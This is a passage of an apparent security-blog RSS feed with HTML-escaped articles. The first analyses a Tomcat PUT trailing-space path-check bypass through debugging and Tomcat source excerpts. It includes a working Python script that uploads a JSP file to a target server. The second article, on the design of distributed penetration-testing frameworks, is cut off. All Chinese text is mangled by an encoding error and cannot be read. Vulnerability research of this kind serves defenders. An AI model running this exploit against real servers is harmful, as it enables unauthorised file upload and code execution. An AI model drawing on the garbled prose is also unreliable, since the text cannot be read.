    }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä¸Šè¿°ä»£ç æœ‰ä¸€ä¸ªéå¸¸éå¸¸ç¥å¥‡çš„åœ°æ–¹ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;canonicalizeWithPrefix(resDir, filename) ä¸ä¼šå»æ‰è·¯å¾„å°¾éƒ¨ç©ºæ ¼&lt;/li&gt;&lt;li&gt;canonicalize0(path) ä¼šå»æ‰è·¯å¾„å°¾éƒ¨ç©ºæ ¼&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ä¸ºäº†æ»¡è¶³è¿›å…¥å­˜åœ¨ canonicalizeWithPrefix çš„åˆ†æ”¯ï¼Œéœ€è¦é€šè¿‡ä¸¤ä¸ªåˆ¤æ–­ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;String res = cache.get(path); åº”ä¸º null ï¼Œæ­¤å¤„ PUT ä¸€ä¸ªä»æœª PUT è¿‡çš„æ–‡ä»¶åå³å¯&lt;/li&gt;&lt;li&gt;resDir = prefixCache.get(dir); åº”ä¸ä¸º null&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å¯ä»¥å‘ç°ï¼Œå¯¹äº prefixCache è¿›è¡Œæ·»åŠ å…ƒç´ çš„æ“ä½œåœ¨ä¸‹æ–¹å­˜åœ¨ canonicalize0 çš„ if åˆ†æ”¯ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;           if (res == null) {
                res = canonicalize0(path);
                cache.put(path, res);
                if (useCanonPrefixCache &amp;amp;&amp;amp; dir != null) {
                    resDir = parentOrNull(res);
                    if (resDir != null) {
                        File f = new File(res);
                        if (f.exists() &amp;amp;&amp;amp; !f.isDirectory()) { // éœ€è¦æ»¡è¶³æ¡ä»¶
                            prefixCache.put(dir, resDir); // è¿›è¡Œ put æ“ä½œ&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é€šè¿‡ä»£ç å¯çŸ¥ï¼Œå¦‚æœæƒ³åœ¨ prefixCache å­˜å…¥æ•°æ®ï¼Œéœ€è¦æ»¡è¶³&lt;b&gt;æ–‡ä»¶å­˜åœ¨&lt;/b&gt;ä¸”&lt;b&gt;æ–‡ä»¶ä¸æ˜¯ç›®å½•&lt;/b&gt;çš„æ¡ä»¶ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;prefixCache å­˜æ”¾çš„æ˜¯ä»€ä¹ˆæ•°æ®å‘¢ï¼Ÿé€šè¿‡å•æ­¥è°ƒè¯•å¯ä»¥å‘ç°ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c3bda57d16a4c9ce6fd36f4fc5f06193_r.jpg&quot; data-rawwidth=&quot;657&quot; data-rawheight=&quot;250&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;resDir ä¸ºæ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ã€‚  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆå¦‚æœæƒ³è¿›å…¥ canonicalizeWithPrefix çš„åˆ†æ”¯ï¼Œéœ€è¦æ»¡è¶³çš„ä¸¤ä¸ªæ¡ä»¶å·²ç»ç†æ¸…æ¥šäº†ã€‚ä» prefixCache.put å¼€å§‹ï¼Œè§¦å‘æ¼æ´éœ€è¦çš„æµç¨‹å¦‚ä¸‹ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03 The Exploit&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é¦–å…ˆï¼Œè¦å‘ prefixCache ä¸­æ·»åŠ å†…å®¹ï¼Œé‚£ä¹ˆéœ€è¦æ»¡è¶³ f.exists() &amp;amp;&amp;amp; !f.isDirectory() è¿™ä¸ªæ¡ä»¶ã€‚ä»ç„¶è¿˜æ˜¯ç©ºæ ¼çš„é”…ï¼š  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe&quot;)
   True
   &amp;gt;&amp;gt;&amp;gt; os.path.exists(&quot;C:/Windows/System32/cmd.exe &quot;)
   True&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œåœ¨æ— å·²çŸ¥æ–‡ä»¶çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åªéœ€è¦å…ˆ PUT åˆ›å»ºä¸€ä¸ª test.txt ï¼Œåœ¨ PUT  ä¸€ä¸ª test.txt%20 ï¼Œå³å¯å‘ prefixCache æ·»åŠ æ•°æ®äº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-cf3dc76a2af468e27d8b2ffb05e5cf5d_r.jpg&quot; data-rawwidth=&quot;850&quot; data-rawheight=&quot;144&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c7469352b8428fc259cc53dc156aa20f_r.jpg&quot; data-rawwidth=&quot;949&quot; data-rawheight=&quot;173&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å•æ­¥æŸ¥çœ‹ï¼Œå‘ç°å·²ç»é€šè¿‡åˆ†æ”¯ï¼Œå¹¶ä¸”å‘ prefixCache æ·»åŠ æ•°æ®ï¼š  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bff33dc63d977443793f73b01a09cd15_r.jpg&quot; data-rawwidth=&quot;992&quot; data-rawheight=&quot;467&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ç€ï¼Œåˆ›å»ºä¸€ä¸ª JSP æ–‡ä»¶ â€œtest.jsp%20â€ ï¼Œå•æ­¥æŸ¥çœ‹ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a7d81e24db7ee37733f7fcb497882f79_r.jpg&quot; data-rawwidth=&quot;884&quot; data-rawheight=&quot;625&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å¯ä»¥å‘ç°ï¼ŒresDir ä¸ä¸º null ï¼Œä¸” res ç»“å°¾å¸¦ç€ç©ºæ ¼ã€‚äºæ˜¯å¯ä»¥é€šè¿‡æœ€å¼€å§‹çš„ canPath.equals(absPath) çš„æ£€æŸ¥ã€‚æŸ¥çœ‹ BurpSuite ä¸­çš„è¿”å›ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6f70c318355bdc1b7c73ac6004204b32_r.jpg&quot; data-rawwidth=&quot;953&quot; data-rawheight=&quot;181&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;å‘ç°å·²ç»åˆ›å»ºæˆåŠŸäº†ã€‚&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Exploit:&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   import sys
   import requests
   import random
   import hashlib
   shell_content = &#39;&#39;&#39;
   RR is handsome!
   &#39;&#39;&#39;
   if len(sys.argv) &amp;lt;= 1:
       print(&#39;Usage: python tomcat.py [url]&#39;)
       exit(1)
   def main():
       filename = hashlib.md5(str(random.random())).hexdigest()[:6]
       put_url = &#39;{}/{}.txt&#39;.format(sys.argv[1], filename)
       shell_url = &#39;{}/{}.jsp&#39;.format(sys.argv[1], filename)
       requests.put(put_url, data=&#39;1&#39;)
       requests.put(put_url + &#39;%20&#39;, data=&#39;1&#39;)
       requests.put(shell_url + &#39;%20&#39;, data=shell_content)
       requests.delete(put_url)
       print(&#39;Shell URL: {}&#39;.format(shell_url))
   if __name__ == &#39;__main__&#39;:
       main()&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6734b1aa82d23171b2a2314fbbec15d3_r.jpg&quot; data-rawwidth=&quot;813&quot; data-rawheight=&quot;209&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 Tomcat 8.5.21!?&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Tomcat 8.5.21 é€šè¿‡ WebResourceRoot æ¥å¤„ç†èµ„æºæ–‡ä»¶ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected transient WebResourceRoot resources = null;
   ...

   @Override
   protected void doPut(HttpServletRequest req, HttpServletResponse resp)
       throws ServletException, IOException {
       ...
       try {
           if (range != null) {
               File contentFile = executePartialPut(req, range, path);
               resourceInputStream = new FileInputStream(contentFile);
           } else {
               resourceInputStream = req.getInputStream();
           }

           if (resources.write(path, resourceInputStream, true)) { // è¿›å…¥ write
               if (resource.exists()) {
                   resp.setStatus(HttpServletResponse.SC_NO_CONTENT);
               } else {
                   resp.setStatus(HttpServletResponse.SC_CREATED);
               }
           } else {&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¥ç€è°ƒç”¨ DirResourceSet.write ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       path = validate(path);
       if (!overwrite &amp;amp;&amp;amp; preResourceExists(path)) {
           return false;
       }
       // main ä¸º DirResourceSet çš„ instance
       boolean writeResult = main.write(path, is, overwrite);
       ...
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;DirResourceSet.write çš„æºç ä¸ºï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   @Override
   public boolean write(String path, InputStream is, boolean overwrite) {
       checkPath(path);
       if (is == null) {
           throw new NullPointerException(
                   sm.getString(&quot;dirResourceSet.writeNpe&quot;));
       }
       if (isReadOnly()) {
           return false;
       }
       File dest = null;
       String webAppMount = getWebAppMount();
       if (path.startsWith(webAppMount)) {
           // è¿›å…¥ file æ–¹æ³•
           dest = file(path.substring(webAppMount.length()), false);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;file æ–¹æ³•ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   protected final File file(String name, boolean mustExist) {
           ...
           String canPath = null;
           try {
               canPath = file.getCanonicalPath();
           } catch (IOException e) {
               // Ignore
           }
           ...
           if ((absoluteBase.length() &amp;lt; absPath.length())
               &amp;amp;&amp;amp; (canonicalBase.length() &amp;lt; canPath.length())) {
               ...
               if (!canPath.equals(absPath))
                   return null;
           }
       } else {
           return null;
       }
       return file;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;æ¢æ±¤ä¸æ¢è¯ï¼Œä¸ºä»€ä¹ˆä¸èƒ½è§¦å‘å‘¢ï¼Ÿç»è¿‡å•æ­¥ï¼Œå‘ç°æˆåŠŸé€šè¿‡åˆ¤æ–­ï¼Œä½†æ˜¯åœ¨æ–‡ä»¶å¤åˆ¶çš„æ—¶å€™å‡ºç°äº†é—®é¢˜ï¼š  &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   try {
       if (overwrite) {
           Files.copy(is, dest.toPath(), StandardCopyOption.REPLACE_EXISTING); // æ­¤å¤„
       } else {
           Files.copy(is, dest.toPath());
       }
   } catch (IOException ioe) {
       return false;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;åœ¨ toPath æ–¹æ³•çš„æ—¶å€™å‡ºç°äº†é—®é¢˜ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   public Path toPath() {
       Path result = filePath;
       if (result == null) {
           synchronized (this) {
               result = filePath;
               if (result == null) {
                   result = FileSystems.getDefault().getPath(path);
                   filePath = result;
               }
           }
       }
       return result;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1b5c33c929fd404a8c2e5e278f48e6d0_r.jpg&quot; data-rawwidth=&quot;998&quot; data-rawheight=&quot;241&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;WindowsPathParser.normalize åˆ¤æ–­æ˜¯æ˜¯ä¸æ˜¯éæ³•çš„å­—ç¬¦ï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static String normalize(StringBuilder sb, String path, int off) {
       ...
       while (off &amp;lt; len) {
           char c = path.charAt(off);
           if (isSlash(c)) {
               if (lastC == &#39; &#39;)
                   throw new InvalidPathException(path,
                                                  &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                                  off - 1);
           ...
           } else {
               if (isInvalidPathChar(c))
                   throw new InvalidPathException(path,
                                                  &quot;Illegal char &amp;lt;&quot; + c + &quot;&amp;gt;&quot;,
                                                  off);
               lastC = c;
               off++;
           }
       }
       if (start != off) {
           if (lastC == &#39; &#39;)
               throw new InvalidPathException(path,
                                              &quot;Trailing char &amp;lt;&quot; + lastC + &quot;&amp;gt;&quot;,
                                              off - 1);
           sb.append(path, start, off);
       }
       return sb.toString();
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ä»¥åŠï¼š&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;   private static final boolean isInvalidPathChar(char var0) {
       return var0 &amp;lt; &#39; &#39; || &quot;&amp;lt;&amp;gt;:\&quot;|?*&quot;.indexOf(var0) != -1;
   }&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;éš¾è¿‡ã€‚&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-09-25-29649377</guid>
<pubDate>Mon, 25 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>æµ…è°ˆåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶çš„æ¶æ„ä¸è®¾è®¡</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-08-25-28781870.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;æµ…è°ˆåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶çš„æ¶æ„ä¸è®¾è®¡&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-59d6dc5eeea4931774877903a65e57a1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;æœ¬æ–‡ä¸å¤§å®¶æ¢è®¨ä¸€äº›å…³äºåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶çš„æ¶æ„ä¸è®¾è®¡çš„è¯é¢˜ï¼Œåˆ†äº«ç¬”è€…çš„ä¸€äº›æ‹™è§ï¼Œå¸Œæœ›èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¯å‘ã€‚æœ¬æ–‡åˆ†ä¸ºä¸‰ä¸ªè¯é¢˜ï¼ˆTopicï¼‰ï¼Œå»ºè®®æŒ‰é¡ºåºé˜…è¯»ï¼Œåœ¨ä¸‰ä¸ªè¯é¢˜ä¸­ï¼Œç¬”è€…å¯¹ä¸¤ä¸ªç—›ç‚¹ï¼ˆæ¶æ„è®¾è®¡ä¸é€šä¿¡ï¼‰åšäº†ä¸€äº›ç»†èŠ‚æè¿°ã€‚&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Topic - æ¸—é€æµ‹è¯•æ¡†æ¶æ˜¯ä»€ä¹ˆ&lt;/li&gt;&lt;li&gt;Topic - éœ€æ±‚åˆ†æä¸æ¶æ„è®¾è®¡&lt;/li&gt;&lt;li&gt;Topic - é€šä¿¡ä¸æ¶ˆæ¯é˜Ÿåˆ—&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Topic - æ¸—é€æµ‹è¯•æ¡†æ¶æ˜¯ä»€ä¹ˆ&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;èƒŒæ™¯&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;ç°åœ¨å¾ˆå¤šå¤§å°å‚å®¶æˆ–è€…å¾ˆå¤šç§äººå›¢é˜Ÿéƒ½åœ¨åšæˆ–è€…å·²ç»æœ‰æˆç†Ÿçš„æ‰«æå™¨ï¼Œå¼€æºä¹Ÿå¥½å†…éƒ¨ä½¿ç”¨ä¹Ÿå¥½ã€‚éƒ½æ˜¯ä¸ºäº†è§£å†³ä¸€äº›å®é™…çš„é—®é¢˜ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;æ¸—é€æµ‹è¯•éœ€è¦&lt;/li&gt;&lt;ul&gt;&lt;li&gt;ä»£æ›¿é‡å¤æ‰‹åŠ¨æ¥åŠ¨&lt;/li&gt;&lt;li&gt;é¿å…é—æ¼å‘ç”Ÿ&lt;/li&gt;&lt;li&gt;ä¼ æ‰¿ï¼ç»§æ‰¿ä¼˜ç§€çš„æµ‹è¯•æ–¹æ³•&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;ä½œä¸ºä¼ä¸šçš„äº§å“ä¹‹ä¸€&lt;/li&gt;&lt;ul&gt;&lt;li&gt;é¢å‘ä¸“ä¸šç”¨æˆ·&lt;/li&gt;&lt;li&gt;é¢å‘æ™®é€šç”¨æˆ·&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;ç°è‰²äº§ä¸šï¼ˆBOTNETï¼‰&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ç®€å•æ¥è¯´ï¼Œæ¸—é€æµ‹è¯•æ¡†æ¶èƒ½è®©ä½ çš„æŸäº›æ¸—é€æµ‹è¯•æµç¨‹å˜çš„æ›´ç®€å•ï¼Œè¾…åŠ©ä¸šåŠ¡å®Œæˆï¼Œç®€åŒ–ä¸€äº›ä¸šåŠ¡é€»è¾‘ã€‚å½“ç„¶å¯¹äºæ¡†æ¶æ¥è¯´ï¼Œå®ƒçš„åŸºæœ¬åŠŸèƒ½å…¶å®æ˜¯ä¿è¯æ’ä»¶çš„æ­£å¸¸è¿è¡Œã€‚å½“ä»–æ‹¥æœ‰äº†å¾ˆå¤šçš„æ’ä»¶çš„æ—¶å€™ï¼Œä»·å€¼æ‰ä¼šçœŸæ­£ä½“ç°å‡ºæ¥ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;æœ¬è´¨&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æ¸—é€æµ‹è¯•æ¡†æ¶å¹¶ä¸æ˜¯ä»€ä¹ˆç‰¹åˆ«é«˜æ·±çš„ä¸œè¥¿ï¼Œç›¸æ¯”ç”µå•†ç³»ç»Ÿä¸­çš„å¾®æœåŠ¡æ¶æ„ï¼Œå¯èƒ½åŸºç¡€æ¶æ„å¹¶æ²¡æœ‰å®ƒå¤æ‚ï¼Œç”šè‡³ç›¸æ¯”ä¹‹ä¸‹å¯ä»¥è¯´æ˜¯å°å·«è§å¤§å·«äº†ã€‚ä½†æ˜¯æ¸—é€æµ‹è¯•æ¡†æ¶ä¹Ÿå¹¶ä¸é€‚åˆå’Œå¾®æœåŠ¡æ¶æ„è¿›è¡Œå¯¹æ¯”ï¼Œå› ä¸ºå®ƒæ›´åŠ çš„çµæ´»ï¼Œä¸€äº›é«˜çº§å¼€å‘æ¦‚å¿µï¼ˆåˆ†å¸ƒå¼ï¼å¾®æœåŠ¡ï¼‰ï¼Œå¯¹ä»–å¹¶ä¸æ˜¯ç‰¹åˆ«é€‚ç”¨ã€‚ä¸€ä¸ªæ¸—é€æµ‹è¯•æ¡†æ¶ï¼æ‰«æå™¨ï¼Œå¯ä»¥éå¸¸ç®€æ´æ˜äº†ï¼Œç”šè‡³å¯ä»¥çœ‹æˆä¸€ä¸ªçµæ´»çš„è„šæœ¬å¼•æ“ï¼Œä½†æ˜¯åŒæ—¶åˆå­˜åœ¨ç€å¾ˆå¤šçš„å¤§å‹çš„æ¸—é€æ¡†æ¶ï¼æ‰«ææ¡†æ¶ï¼ˆNessusï¼OpenVASï¼‰ï¼Œè¿™äº›æ¡†æ¶çš„å¤æ‚ç¨‹åº¦è¿œè¿œé«˜äºæ™®é€šçš„è„šæœ¬å¼•æ“ã€‚è¯´æ¸—é€æµ‹è¯•æ¡†æ¶ï¼æ‰«æå™¨çš„æœ¬è´¨ï¼Œå¹¶ä¸å¥½æ ¹æ®ä»–çš„ç‰¹å¾è¯´å…·ä½“å®ƒæ˜¯ä¸€ä¸ªä»€ä¹ˆæ ·çš„ç¨‹åºï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¸€ä¸ªå•æœºè¿è¡Œï¼åˆ†å¸ƒå¼çš„ç¨‹åºæ¡†æ¶&lt;/li&gt;&lt;li&gt;é«˜è´¨é‡çš„æ‰«ææ¨¡å—ï¼Œæˆ–è€…çµæ´»çš„è„šæœ¬å¼•æ“&lt;/li&gt;&lt;li&gt;ç¨³å®šçš„åŸºç¡€è®¾æ–½ï¼Œé€»è¾‘å¯ç¼–ç¨‹æ§åˆ¶&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;è§£å†³çš„é—®é¢˜&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;ä»£æ›¿æŸäº›é‡å¤çš„æ‰‹å·¥åŠ³åŠ¨&lt;/li&gt;&lt;li&gt;å›ºå®šé€»è¾‘è¾“å‡º&lt;/li&gt;&lt;li&gt;ç¨³å®šçš„è¾“å‡º&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;ä¸èƒ½è§£å†³çš„é—®é¢˜&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;å¸¦æœ‰å¤æ‚é€»è¾‘çš„æ¼æ´æ— æ³•æ£€æµ‹&lt;/li&gt;&lt;li&gt;åˆ†å¸ƒå¼æ¸—é€æ¡†æ¶è®¾è®¡ä¸å®ç°éš¾åº¦é«˜&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;æ™®é€‚æ€§çš„è§„åˆ™&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å¯¹äºä¸€ä¸ªè¿™ç§æ¡†æ¶æ¥è¯´ï¼Œå†ç®€åŒ–ç®€åŒ–ç®€åŒ–æ¨¡å‹ï¼Œå®ƒæœ€ç»ˆä¼šå˜æˆä¸€ä¸ª RPCï¼ˆRemote Procedure Callï¼‰è°ƒç”¨å¤šç§ç¨‹åºï¼ˆåŠŸèƒ½å•å…ƒï¼‰çš„æ¡†æ¶ï¼Œå½“ç„¶è¿™é‡Œä¸æ˜¯è¯´å…·ä½“çš„ RPC åè®®ï¼Œè€Œæ˜¯ä¸€ä¸ªæ³›åŒ–çš„ RPC çš„æ¦‚å¿µï¼›æˆ–è€…å˜æˆä¸€ä¸ªç›´æ¥è°ƒç”¨å¤šç§ç¨‹åºï¼ˆåŠŸèƒ½å•å…ƒï¼‰çš„æ¡†æ¶ã€‚&lt;/p&gt;&lt;p&gt;ä¸æ™®é€š RPC æœ€å¤§çš„å·®åˆ«å°±æ˜¯ï¼šä»»åŠ¡ç§ç±»å¤šæ ·ï¼Œä»»åŠ¡å¯èƒ½å­˜åœ¨æ›´æ–°çš„æƒ…å†µï¼Œæ‰§è¡Œä»»åŠ¡ç¯å¢ƒéå¸¸å¤æ‚ã€‚è€Œä¸”æ¡†æ¶æœ¬èº«éœ€è¦æ”¯æŒé«˜åº¦çµæ´»çš„åŠŸèƒ½å•å…ƒï¼ˆæ’ä»¶ï¼‰ã€‚æˆ–è€…ç”¨å¦ä¸€å¥è¯æ¥è¯´ï¼Œè¢«è°ƒç”¨çš„ç¨‹åºï¼ˆåŠŸèƒ½æ¨¡å—ï¼‰å¯¹äºæ¡†æ¶æ¥è¯´ï¼Œæ˜¯éå¸¸éå¸¸æ¾æ•£çš„ï¼Œç”šè‡³å¤±æ•ˆï¼è¿‡æ—¶éƒ½ä¸ä¼šå½±å“ä»»ä½•æ¡†æ¶çš„è¿è¡Œã€‚&lt;/p&gt;&lt;p&gt;è¿™æ ·æ¥è¯´ï¼Œå®ƒåˆä¸èƒ½ç®€å•çš„è¯´æ˜¯ä¸€ä¸ª RPCï¼ŒåŸºäºä¸Šè¿°çš„æƒ…å½¢ï¼Œä»–åœ¨è®¾è®¡çš„æ—¶å€™ï¼Œæ’é™¤åæœŸæ¨¡å—æ³¨å†Œç­‰æœºåˆ¶ï¼Œæ¡†æ¶æœ¬èº«æ˜¯ä¸èƒ½ä¸»åŠ¨çŸ¥é“ä»–ä¼šæœ‰å¤šå°‘ç§ç±»ï¼Œå¤šå°‘æ•°é‡çš„ç¨‹åºå¯ä»¥è®©ä»–åœ¨è¿œç¨‹è°ƒç”¨ï¼ŒåŒæ—¶ä¹Ÿä¸çŸ¥é“è¿™äº›ç¨‹åºçš„åŸºç¡€æ¥å£åˆ°åº•æ˜¯ä»€ä¹ˆã€‚å› æ­¤ç”¨ RPC æ¥æè¿°ï¼Œåˆä¸æ˜¯ç‰¹åˆ«æ°å½“ã€‚&lt;/p&gt;&lt;p&gt;é‚£ä¹ˆï¼Œåœ¨å¯¹äºæ¡†æ¶æ¥è¯´ï¼Œæˆ‘ä»¬æœ€å¥½é‡‡ç”¨å“ªç§å½¢å¼æ¥æè¿°ï¼Ÿå½“ç„¶ï¼Œæ¯ä¸ªäººæœ‰æ¯ä¸ªäººçš„çœ‹æ³•ï¼Œæˆ‘æ›´åå‘äºä½¿ç”¨ &lt;b&gt;æ¾æ•£çš„ä¸»ä»æ¶æ„ï¼ˆLoose Master-Slaveï¼‰&lt;/b&gt; è¿™æ ·çš„æè¿°æ¥ä½œä¸ºè¿™ç±»æ¡†æ¶çš„æ¶æ„æ¨¡å‹ï¼šè‡ªç„¶ Slave è¡¨ç¤ºåŠŸèƒ½å•å…ƒæˆ–è€…è¢«è°ƒç”¨çš„ç¨‹åºï¼ŒMaster åˆ™ä»£è¡¨æ§åˆ¶å™¨ï¼è°ƒç”¨è€…æˆ–è€…æ•´ä½“äº‹åŠ¡é€»è¾‘å¤„ç†çš„èŠ‚ç‚¹ï¼ŒLoose åˆ™ä»£è¡¨äº† Slave å’Œ Master ä¹‹é—´çš„å…³ç³»ï¼Œç›¸äº’çš„ä¾èµ–æ€§ä¸æ˜¯ç‰¹åˆ«çš„å¼ºï¼Œå¯ä»¥é‡‡ç”¨å…¶ä»–çš„æœºåˆ¶æ¥ç»´æŠ¤ä»–ä»¬ä¹‹é—´çš„è”ç³»ï¼Œæ¯”å¦‚æ³¨å†Œæˆ–è®¢é˜…æœºåˆ¶ç­‰ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;è¡¥å……è¯´æ˜&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;å½“ç„¶æ¡†æ¶å’Œæ¸—é€æµ‹è¯•å·¥å…·æ˜¯ä¸ä¸€æ ·çš„ï¼Œå·¥å…·å¤§å¯ç›´æ¥ä½¿ç”¨åˆ†å±‚æ¶æ„ï¼Œç”šè‡³å¯ä»¥ä¸ç”¨å¤ªæ³¨æ„é¡¹ç›®æ¨¡å‹å’Œç»“æ„ç›¸å…³çš„éƒ¨åˆ†ï¼Œç›´æ¥é¢å‘è¿‡ç¨‹å®ç°æŸä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæˆ–è€…éƒ¨åˆ†æˆ–è€…æ•´ä½“ä½¿ç”¨å¾®å†…æ ¸æ¶æ„æä¾›ä¸€å®šçš„çµæ´»æ€§ã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;ç°ä¸»æµæ‰«æå™¨ï¼æ¡†æ¶çš„æ¨¡å‹åˆ†ç±»&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;å•æœºä¸åˆ†å¸ƒå¼ï¼šæœ¬æ–‡ä¸­å•æœºä¸åˆ†å¸ƒå¼çš„æœ€å¤§çš„åŒºåˆ«ä¸æ˜¯æ˜¯å¦è”ç½‘ï¼Œè€Œæ˜¯å…·ä½“çš„æ‰§è¡Œä»»åŠ¡çš„å·¥ä½œèŠ‚ç‚¹æ˜¯å¦åœ¨ä¸€å°æœºå™¨ä¸Šã€‚&lt;/li&gt;&lt;li&gt;å¾®å†…æ 